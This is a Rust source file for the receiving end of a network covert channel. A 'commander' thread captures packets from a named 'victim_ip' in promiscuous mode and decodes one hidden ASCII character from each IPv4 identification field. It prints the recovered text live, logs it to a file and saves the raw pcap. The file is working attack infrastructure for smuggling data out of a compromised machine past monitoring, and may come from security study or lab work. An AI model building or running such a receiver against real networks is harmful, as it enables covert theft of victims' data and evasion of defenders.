use chrono::Local;
use pcap::{Capture, Device, Linktype};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::io::{self, Write};
use std::fs::{OpenOptions, create_dir_all};
use std::path::{Path, PathBuf};

use pnet::packet::ipv4::Ipv4Packet;

pub struct PcapHandle {
    running: Arc<AtomicBool>,
}

impl PcapHandle {
    pub fn start(interface: &str, victim_ip: String) -> Self {
        let running = Arc::new(AtomicBool::new(true));
        let flag = running.clone();
        let iface = interface.to_string();

        thread::spawn(move || {
            // ------------------------------------------------
            // 1. Locate interface
            // ------------------------------------------------
            let devices = Device::list().expect("Failed to list devices");

            let device = match devices.into_iter().find(|d| d.name == iface) {
                Some(d) => d,
                None => {
                    eprintln!("\n[!] Interface '{}' not found.", iface);
                    return;
                }
            };

            // ------------------------------------------------
            // 2. Ensure PCAP directory exists
            // ------------------------------------------------
            // From /source → ../data/pcaps
            let pcap_dir = Path::new("../data/pcaps");

            if let Err(e) = create_dir_all(pcap_dir) {
                eprintln!("[!] Failed to create pcap directory: {}", e);
                return;
            }

            // ------------------------------------------------
            // 3. Setup filenames
            // ------------------------------------------------
            let ts = Local::now().format("%Y%m%d_%H%M%S");

            let mut pcap_path = PathBuf::from(pcap_dir);
            pcap_path.push(format!("commander_{}.pcap", ts));

            let mut log_path = PathBuf::from(pcap_dir);
            log_path.push("captured_ascii.txt");

            println!("\n[*] PCAP capture active: {}", pcap_path.display());
            println!("[*] Monitoring covert channel from: {}", victim_ip);

            // ------------------------------------------------
            // 4. Open capture handle (blocking / event-driven)
            // ------------------------------------------------
            let mut cap = Capture::from_device(device)
                .unwrap()
                .promisc(true)
                .snaplen(65535)
                .timeout(-1) // fully blocking
                .open()
                .unwrap();

            // BPF filter (Layer 3)
            let filter = format!("ip src {}", victim_ip);
            cap.filter(&filter, true)
                .expect("Failed to apply BPF filter");

            let linktype = cap.get_datalink();

            let mut dump = cap
                .savefile(&pcap_path)
                .expect("Failed to create pcap savefile");

            // ------------------------------------------------
            // 5. Capture loop
            // ------------------------------------------------
            while flag.load(Ordering::Relaxed) {

                if let Ok(packet) = cap.next_packet() {

                    // Write raw packet to PCAP
                    dump.write(&packet);

                    // Determine Layer 3 offset
                    let ip_start = match linktype {
                        Linktype(1) => 14,   // Ethernet
                        Linktype(113) => 16, // Linux cooked
                        Linktype(0) => 4,    // Loopback
                        _ => continue,
                    };

                    if packet.data.len() <= ip_start {
                        continue;
                    }

                    if let Some(ip_packet) =
                        Ipv4Packet::new(&packet.data[ip_start..])
                    {
                        let covert_byte =
                            (ip_packet.get_identification() & 0x00FF) as u8;

                        if (32..=126).contains(&covert_byte) {
                            let c = covert_byte as char;

                            // Print live
                            print!("{}", c);
                            io::stdout().flush().unwrap();

                            // Append to file
                            if let Ok(mut file) = OpenOptions::new()
                                .create(true)
                                .append(true)
                                .open(&log_path)
                            {
                                write!(file, "{}", c).ok();
                            }
                        }
                    }
                }
            }

            println!("\n[*] Capture stopped for {}", victim_ip);
        });

        Self { running }
    }
}

impl Drop for PcapHandle {
    fn drop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
    }
}

